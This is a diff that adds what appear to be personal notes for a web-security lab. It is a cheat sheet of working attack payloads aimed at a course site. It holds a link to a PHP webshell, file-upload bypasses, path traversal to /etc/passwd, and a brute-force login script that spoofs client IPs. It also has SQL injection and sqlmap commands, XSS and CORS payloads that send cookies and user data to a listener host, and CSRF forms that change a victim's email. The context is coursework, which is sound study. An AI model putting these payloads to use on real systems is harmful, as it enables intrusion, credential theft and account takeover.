@@ -1,0 +1,145 @@
+https://docs.google.com/document/d/1weHw4zHzpQf-F3opMPlodW5PWfYIGnNr9rhRt3t2oI0/edit?tab=t.0
+error inducing payloads
+
+information disclosure - check html, css, robots.txt, sitemaps
+	for error - try string for int in url like courseid=aaaaaa
+		or too large int courseid=111111111111111111111111111
+		
+foxyproxy setup
+
+character encoding
+
+url fragmenting - http://api.bodhitree.com:30000/v1/admin#http://api.bodhitree.com:30000/v1/syllabus/?courseid=3
+
+reverse shell payload for file upload - https://github.com/phpwebshell/c99shell
+
+
+.htaccess for file upload - AddType application/x-httpd-php .evil
+
+php payload to print id - <?php system('id'); ?>
+
+filename bypass for file upload - shell.php%00.gif
+
+path traversal - value="../../../../../etc/passwd" or value="../../../../../etc//passwd%00.html"
+
+password guessing exploit.py - 
+		#!/usr/bin/python3
+		import string, requests
+
+		# DO NOT CHANGE SECTION STARTS
+		# -----------------------------------------------------------
+
+		loginDetails = {
+		    "username": "admin",
+		    "password": "SecretPwd!" # Palceholder for password. Change to expected needs.
+		}
+
+		header={
+		    "X-Forwarded-For": "10.10.10.10" #Placeholder for client IP address
+		}
+
+		# Login URL
+		loginUrl = "http://localhost:30000/"
+
+		# Get the CSRF token. Important if the website uses CSRF tokens
+		session = requests.Session()
+		res = session.get(loginUrl)
+		loginDetails["csrfmiddlewaretoken"] = res.text.split("csrfmiddlewaretoken\" value=\"")[-1].split("\"")[0]
+
+		# Get all passwords from the password list
+		data = list()
+		with open("/home/labDirectory/passwords.lst", "rt") as f:
+		    for line in f.readlines():
+			data.append(line.strip())
+
+		def printFinalOutput(password):
+		    print(f"\t[+] Found a valid username:password pair--> admin:{password}")
+
+		# -----------------------------------------------------------
+		# DO NOT CHANGE SECTION ENDS
+
+
+		# Brute force the password
+		i=0
+		j=0
+		l=0
+		while(l<len(data)):
+		    ################ Write bruteforce logic here by filling the blanks###############
+		    ############ specified as __(FIB)__ #############################################
+		    #################################################################################
+		    header["X-Forwarded-For"] = "10.14." + str(i) + "." + str(j)
+		    j+=1
+		    if(j==256):
+			i+=1
+			j=0
+		    for k in range(1,5):
+			loginDetails["password"] = data[l]
+			print(f"[*] Bruteforce attempt #{l+1}, Trying password: " + data[l])
+			response = session.post(loginUrl, data=loginDetails, headers=header)
+			if response.status_code == 200 and "Incorrect Username or Password." not in response.text:
+			    printFinalOutput(data[l]) # Send the password for final output
+			    exit(0)
+			l+=1
+			loginDetails["csrfmiddlewaretoken"] = response.text.split("csrfmiddlewaretoken\" value=\"")[-1].split("\"")[0]
+		print("[-] No Password found for admin user")
+		
+		
+The regex to cover strings aa to zz is [a-z]{2}
+
+2fa - generate for admin then enumerate in otp sending request
+
+basic password sql payload - ' OR 1=1-- ' AND pwdhash='X26&'
+
+union based on table structure - ' OR 1=1 UNION SELECT 1, password, 2, 0 FROM users-- 
+
+sqlmap - sqlmap -u 'http://localhost:30000/participants.php?courseid=5' --cookie='PHPSESSID=qp2rc26es029oci6cdeuvn0of3' --search -T users --batch
+
+xss - 
+	/participants/?courseid=2&search=<script>alert("hacked");</script>
+	/grades/?courseid=2&?input=%3Cscript%3Ealert(%22hacked%22);%3C/script%3E
+	/participants/?courseid=2&search=<script>var+i%3Dnew+Image()%3B+i.src%3D"http%3A%2F%2Flocalhost%3A30001%2F%3Fcookie%3D"%2Bbtoa(document.cookie)%3B<%2Fscript>
+	for bypassing html escaping - use url encoded character and insert filtered word
+	/participants/?courseid=5&search=%253scriptCscscriptript%253scriptEalalertert('hacked')%253scriptC%2Fscscriptript%253scriptE
+	
+cors -
+	<script>
+	fetch('http://localhost:30000/userData/', { credentials: 'include' })
+	  .then(r => r.text())
+	  .then(j => location = 'http://localhost:30001/log?key=' + j);
+	</script>
+	
+	trusted subdomain
+	<script>document.location="http://app.bodhitree.com:30000/participants/?
+	courseid=2&search=%3Cscript%3Efetch%28%27http%3A%2F%2Fapp.bodhitree.com%3A30000%2FuserData%27%2C%20%7Bcredentials%3A%27include%27%7D%29.then%28r%3D%3Er.text%28%29%29.
+	then%28j%3D%3Elocation%3D%27http%3A%2F%2Flocalhost%3A30001%2Flog%3Fkey%3D%27%2BencodeURIComponent%28j%29%29%3B%3C%2Fscript%3E"</script>
+	
+csrf - JS form
+	<form action="http://localhost:30000/updateEmail/" method="POST">
+	  <input type="hidden" name="new_email" value="attacker@example.com">
+	</form>
+
+	<script>
+	  document.forms[0].submit();
+	</script>
+	
+	csrf token 
+	<form action="http://localhost:30000/updateEmail/" method="POST">
+	<input type="hidden" name="csrftoken" value="adf84b8fcc83a953c670cadc02d5a823ce59a3d729cec674dd6e6828301e2458">
+	<input type="hidden" name="new_email" value="attacker@example.com">
+	</form> 
+
+	<script>
+	document.forms[0].submit();
+	</script>
+	
+	cookie - create own cookie then add to form
+	<script>document.cookie = "csrftoken=123456789; path=/"</script>
+
+	<form action="http://localhost:30000/updateEmail/" method="POST">
+	 <input type="hidden" name="new_email" value="attacker@example.com">
+	<input type="hidden" name="csrftoken" value="123456789">
+	</form>
+
+	<script>
+	  document.forms[0].submit();
+	</script>
